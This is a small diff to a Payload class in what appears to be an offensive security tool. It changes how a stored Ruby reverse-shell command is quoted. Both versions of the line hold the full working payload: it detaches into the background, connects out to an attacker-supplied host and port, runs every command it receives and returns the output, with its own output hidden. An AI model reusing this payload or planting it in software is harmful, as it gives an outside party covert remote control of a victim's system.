@@ -23,4 +23,4 @@ class Payload:
 
     attrs = {}
 
-    data = r"nohup ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"*LHOST*\",\"*LPORT*\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}' > /dev/null 2>&1 & disown"
+    data = "nohup ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"*LHOST*\",\"*LPORT*\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}' > /dev/null 2>&1 & disown"
